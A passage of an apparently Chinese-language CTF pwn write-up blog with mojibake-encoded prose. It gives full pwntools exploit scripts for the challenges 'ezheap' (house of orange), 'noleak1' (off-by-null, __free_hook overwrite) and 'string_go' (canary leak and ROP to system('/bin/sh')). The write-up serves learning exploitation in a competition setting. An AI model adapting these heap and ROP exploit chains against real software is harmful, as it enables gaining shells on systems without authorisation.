vtable-&gt;__overflow</span></span><br><span class="line"><span class="comment">#payload1 += p64(0)*2</span></span><br><span class="line">payload1 += p64(system_addr)                  <span class="comment"># __overflow</span></span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå€¼å¾—è¯´ä¸€ä¸‹çš„æ˜¯<code>heap_base + 0x548</code>çš„è¿™ä¸ªç‚¹ï¼Œè¿™ä¸ª0x548æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•è®¡ç®—å‡ºæ¥çš„ï¼Œä¸€èˆ¬ç­‰äºä½ å½“å‰<code>_chain</code>æŒ‡å‘çš„çš„åœ°å€+0xc0ï¼Œæœ€ç»ˆç›®çš„æ˜¯å°†<code>__overflow</code>è¦†ç›–æˆ<code>system</code></p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/48.png" alt="pic"></p>
<h4 id="å®Œæ•´exp-6"><a href="#å®Œæ•´exp-6" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;47.108.195.119&quot;,20141)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Name?&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;è¯·è¾“å…¥ä½ çš„é˜Ÿä¼åç§°:&quot;)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;haruki&quot;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;è¯·è¾“å…¥ä½ çš„idæˆ–åå­—:&quot;)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;haruki&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+ <span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x3b7a63</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x548</span>)</span><br><span class="line"><span class="comment">#payload1 += p64(0)*2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#add(0)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&quot;0x20&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>ç”±äºhouse_of_orangeçš„åˆ©ç”¨æ–¹å¼ä¸æ˜¯å¾ˆç¨³å®šæ‰€ä»¥å¯èƒ½è¦å¤šè¯•å‡ æ¬¡æ‰èƒ½getshellã€‚</p>
<h2 id="2021-11-29"><a href="#2021-11-29" class="headerlink" title="2021-11-29"></a>2021-11-29</h2><p>æœ¬å‘¨ç”±äºè€ƒè¯•ä»¥åŠä¸€äº›å…¶å®ƒç›¸å…³çš„æ‚äº‹ä¼šåœæ­¢æ›´æ–°ä¸‹å‘¨ä¸€ç»§ç»­ã€‚</p>
<h2 id="2021-11-30"><a href="#2021-11-30" class="headerlink" title="2021-11-30"></a>2021-11-30</h2><h3 id="2021-å®‰æ´µæ¯-noleak1"><a href="#2021-å®‰æ´µæ¯-noleak1" class="headerlink" title="[2021 å®‰æ´µæ¯]noleak1"></a>[2021 å®‰æ´µæ¯]noleak1</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/noleak.zip">é™„ä»¶</a></p>
<p>è™½ç„¶è¿™å‘¨å®éªŒæ‹‰æ»¡ï¼Œè¿˜è¦å¤ä¹ è€ƒè¯•ï¼Œä½†æ„Ÿè§‰ä¸€å¤©ä¸åšé¢˜è¿˜æ˜¯æœ‰ç‚¹ç©ºè™šï¼Œè¿™é‡Œå°±å†™ä¸€ç®€å•çš„off by null(æ¯”èµ›ä¸­æ²¡çœ‹å‡ºæ¥off by nullè¿˜æ˜¯å¤ªèœ)</p>
<h4 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>secertå‡½æ•°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/49.png" alt="pic"></p>
<p>å¼€å±€è¦å…ˆè¿‡ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œç»é€†å‘ğŸ‘´åˆ†ææ˜¯ä¸ªæ …æ ï¼Œè§£å¯†å¾—<code>N0_py_1n_tHe_ct7</code></p>
<p>è¿‡äº†scerteä¹‹åå°±å¯ä»¥è¿›å…¥èœå•äº†ã€‚</p>
<p>addå‡½æ•°ä¸­å¹¶æ²¡æœ‰é™åˆ¶ç”³è¯·å †å—çš„å¤§å°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ªå¤§äº0x420(tcache max)chunké‡Šæ”¾è¿›unsorted binï¼Œå†ç”³è¯·ä¸€ä¸ªå—ç„¶åé€šè¿‡æ®‹ç•™çš„æŒ‡é’ˆæ¥æ³„éœ²å‡ºlibc</p>
<p>å½“æ—¶åšåˆ°è¿™é‡Œçš„æ—¶å€™æˆ‘å°±å¡ä½äº†ï¼Œå½“æ—¶çš„æ€è·¯æ˜¯æƒ³è¿™æ‰¾ä¸€ä¸ªåœ°æ–¹å»åŠ«æŒfree_hookçš„ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ï¼Œèµ›åçœ‹wpæ‰çŸ¥é“æ˜¯off by nullå»å®ç°chunk overlapã€‚å…¶å®ä»¥å‰ä¹Ÿåšè¿‡ç›¸ä¼¼çš„é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™è¿˜æ˜¯æ²¡æœ‰æƒ³åˆ°é‚£ä¸ªåœ°æ–¹å»ï¼Œè¿˜æ˜¯æ€è€ƒçš„å°‘äº†ã€‚ã€‚ã€‚</p>
<p>å…³äºoff by nullçš„å…·ä½“åŸç†ä»¥åŠåˆ†æå¯ä»¥çœ‹è¿™ç¯‡<a href="https://www.anquanke.com/post/id/208407">åšå®¢</a>, ç”±äºæ˜¯wpæ‰€ä»¥ä¸ä¼šè®²å¤ªå¤šçš„åŸç†ï¼Œåªä¼šè®²ä¸€äº›å…·ä½“çš„åˆ©ç”¨ã€‚</p>
<p>è¿™é‡Œäº†æˆ‘ä»¬æ„é€ 3ä¸ªchunk,3ä¸ªchunkæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<pre><code>chunk1:sizeè¦å¤§äºtcache maxä¹Ÿå°±æ˜¯è¦å¤§äº0x420ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†é˜²æ­¢æ„é€ çš„chunkè¿›å…¥tcacheè€Œæ— æ³•åˆå¹¶ï¼Œå¦‚æœé™åˆ¶äº†chunkçš„å¤§å°ï¼Œé‚£ä¹ˆä¸€å®šè¦å…ˆå¡«æ»¡tcache
chunk2:sizeè¦ç­‰äº0xk8è¿™é‡Œæ¶‰åŠåˆ°Glibcå †ç®¡ç†æœºåˆ¶ä¸­ç©ºé—´å¤ç”¨,ä¸”ä¸ºäº†æ–¹ä¾¿åé¢tcacheå»åŠ«æŒfree_hookå…¶ä»–å°ä¸èƒ½å¤§äºtcache max
chunk3:è¦ä¿è¯å…¶çš„sizeåŸŸä¸€å®šè¦æ˜¯0x100çš„æ•´å€æ•°ï¼Œä¸”å¤§å°å¤§äºtcache max
</code></pre><p>å…ˆé‡Šæ”¾æ‰<code>chunk1</code>,æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹<code>chunk3</code>çš„<code>p_size</code>ä¸º<code>chunk1+chunk2</code>å°±ä½¿å¾—<code>chunk1</code>,<code>chunk2</code>åˆå¹¶,ç„¶åå†å°†<code>chunk2</code>é‡Šæ”¾è¿›<code>unsorted bin</code>ä¸­åˆå¹¶ã€‚æ­¤æ—¶çš„<code>chunk2</code>å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œè€Œæˆ‘ä»¬ä»ç„¶å¯æ§ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦å°†<code>chunk2</code>å†ç”³è¯·å‡ºæ¥å°±èƒ½è¾¾åˆ°<code>overlap</code>çš„æ•ˆæœ,æ¥ä¸‹æ¥åŠ«æŒ<code>free_hook</code>å¯¹æˆ‘ä»¬æ¥è¯´å°±è½»è€Œæ˜“ä¸¾äº†ã€‚</p>
<h4 id="è§£é¢˜æ­¥éª¤-5"><a href="#è§£é¢˜æ­¥éª¤-5" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="Step1-secert"><a href="#Step1-secert" class="headerlink" title="Step1 secert"></a>Step1 secert</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;N0_py_1n_tHe_ct7&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step2-leak"><a href="#Step2-leak" class="headerlink" title="Step2 leak"></a>Step2 leak</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>) <span class="comment">#é˜²æ­¢åˆå¹¶</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#edit(0,p64(0))</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="Step3-overlap"><a href="#Step3-overlap" class="headerlink" title="Step3 overlap"></a>Step3 overlap</h5><p>åœ¨è¿™ä¹‹å‰è¦å…ˆæŠŠunsorted binæ¸…ç©º<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x3e0</span>)  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0x420</span> + <span class="number">0x10</span> + <span class="number">0x70</span> + <span class="number">0x10</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure></p>
<h5 id="åŠ«æŒfree-hook"><a href="#åŠ«æŒfree-hook" class="headerlink" title="åŠ«æŒfree_hook"></a>åŠ«æŒfree_hook</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp-7"><a href="#å®Œæ•´exp-7" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;noleak1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;N0_py_1n_tHe_ct7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#edit(0,p64(0))</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3e0</span>)  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0x420</span> + <span class="number">0x10</span> + <span class="number">0x70</span> + <span class="number">0x10</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-12-09"><a href="#2021-12-09" class="headerlink" title="2021-12-09"></a>2021-12-09</h2><h3 id="2021-è¥¿æ¹–è®ºå‰‘-string-go"><a href="#2021-è¥¿æ¹–è®ºå‰‘-string-go" class="headerlink" title="[2021 è¥¿æ¹–è®ºå‰‘] string_go"></a>[2021 è¥¿æ¹–è®ºå‰‘] string_go</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/string_go">é™„ä»¶</a> æœ¬åœ°ç”¨çš„ubuntuç‰ˆæœ¬ä¸ºubuntu18 11.4</p>
<p>è¿™é“é¢˜å…¶å®æ˜¯ä¸€é“å¾ˆç®€å•çš„é¢˜ï¼Œåªæ˜¯æˆ‘å½“æ—¶æ¯”èµ›çš„æ—¶å€™çœ‹åˆ°c++å°±å¼€æ‘†ï¼Œå¯¼è‡´è¿™ä¸ªé¢˜æ²¡å‡ºï¼Œè¿˜æ˜¯è‡ªå·±æ€åº¦çš„é—®é¢˜å§ï¼Œç»è¿‡è¿™æ¬¡æ¯”èµ›æ¶¨äº†ä¸ªæ•™è®­ã€‚</p>
<h4 id="é¢˜ç›®åˆ†æ-8"><a href="#é¢˜ç›®åˆ†æ-8" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>ç”±äºè‡ªå·±æ²¡æœ‰å­¦è¿‡c++ï¼Œæ‰€ä»¥IDAåæ±‡ç¼–å‡ºæ¥é‚£ä¸€å¤§ä¸²ä¸æ˜¯çœ‹çš„å¾ˆæ‡‚ï¼Œæ‰€ä»¥åˆ†æç¨‹åºçš„æ—¶å€™å°±æ˜¯ä¸€é¡¿è¿è’™å¸¦çŒœ</p>
<p>é¦–å…ˆçœ‹ä¸»å‡½æ•°<br><img src="https://gitee.com/Nss-harukii/images/raw/master/56.png" alt="pic"></p>
<p>menu ä¼šæ‰“å°ä¸€ä¸ªè¿™æ ·çš„èœå•</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/57.png" alt="pic"></p>
<p>ç„¶åpython_inputå‡½æ•°ä¼šè·å–æˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„è¾“å…¥</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/58.png" alt="pic"></p>
<p>ç„¶åæ˜¯calc ,è¿™ä¸ªå‡½æ•°æˆ‘æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œä½†æ„Ÿè§‰æ˜¯ä¸€ä¸ªæ£€æŸ¥è¾“å…¥åˆæ³•æ€§çš„å‡½æ•°ï¼Œèµ›åçœ‹å¤§ä½¬ä»¬çš„wpæ„Ÿè§‰åº”è¯¥æ˜¯ä¸€ä¸ªå¤„ç†ç®—å¼çš„å‡½æ•°ï¼Œç„¶åå°†è®¡ç®—çš„ç»“æœè¿”å›ï¼Œå¦‚æœè¿”å›å€¼ä¸º3åˆ™è¿›å…¥æ¥ä¸‹æ¥çš„åˆ¤æ–­</p>
<p>æ¥ä¸‹æ¥ä¼šè¿›å…¥lative_funcå‡½æ•°ï¼Œå¬åå­—åº”è¯¥å°±æ˜¯ä¸ªæœ‰æ´çš„å‡½æ•°ï¼Œä½†æ˜¯ç”±äºä¸å¤ªçœ‹çš„æ‡‚åˆ°è¿™é‡ŒåŸºæœ¬éƒ½é çŒœäº†<br><img src="https://gitee.com/Nss-harukii/images/raw/master/59.png" alt="pic"></p>
<p>é¦–å…ˆï¼Œå…ˆè¾“å…¥v7çš„å€¼ï¼Œè¿™é‡Œè¦æ±‚v7å°äºç­‰äº7ï¼Œç”±äºv7æ˜¯intå‹æ‰€ä»¥è¾“å…¥è´Ÿæ•°ä¹Ÿå¯ä»¥é€šè¿‡åˆ¤æ–­ï¼Œ</p>
<p>æ¥ä¸‹æ¥è¾“å…¥v10ç„¶åæ˜¯<code>v2 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](v10, v7)</code>è¿™å¥è¯çš„æ„æ€æ˜¯å°†v2èµ‹å€¼ä¸ºv10çš„ç¬¬v7ä¸ªå€¼</p>
<p>ä»¥ä¸‹æ˜¯é çŒœæµ‹ : è¿™é‡Œçš„v7ä¼šè¢«å½“ä½œä¸€ä¸ªæ— ç¬¦å·æ•´æ•°è€Œå¯¼è‡´æº¢å‡ºï¼Œç„¶ååœ¨æ‰“å°v10çš„æ—¶å€™ä¼šå°†æ ˆä¸­çš„ä¸œè¥¿leakå‡ºæ¥ï¼Œç„¶åè¿™é‡Œå¯ä»¥leakå‡ºlibcå’Œcanaryï¼ˆåç§»åŠ¨æ€è°ƒè¯•å¾—åˆ°ï¼‰</p>
<p>æ¥ä¸‹æ¥è¾“å…¥v9,ç›´æ¥æº¢å‡ºæ¥ropè¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯è¦åŠ¨æ€è°ƒè¯•è®¡ç®—ä¸€ä¸‹æº¢å‡ºååˆ°retçš„è·ç¦»</p>
<h4 id="å®Œæ•´exp-8"><a href="#å®Œæ•´exp-8" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;string_go&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x61b800</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">0x12</span>)</span><br><span class="line">canary =u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#print(canary)</span></span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;bbbbbbbb&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;bbbbbbbbb&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/60.png" alt="pic"></p>
<h2 id="2021-12-10"><a href="#2021-12-10" class="headerlink" title="2021-12-10"></a>2021-12-10</h2><h3 id="æ¹–æ¹˜æ¯2021-2021-Game"><a href="#æ¹–æ¹˜æ¯2021-2021-Game" class="headerlink" title="[æ¹–æ¹˜æ¯2021 2021]Game"></a>[æ¹–æ¹˜æ¯2021 2021]Game</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/game">é™„ä»¶</a></p>
<p>è¿™é“é¢˜çš„åˆ©ç”¨æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œéš¾å°±éš¾åœ¨æ‰¾å‡ºåˆ©ç”¨ç‚¹ï¼Œè¿™é“é¢˜ä¹Ÿæ¯”è¾ƒé€‚åˆé€†å‘æ–°æ‰‹æ¥ç»ƒä¹ é€†å‘</p>
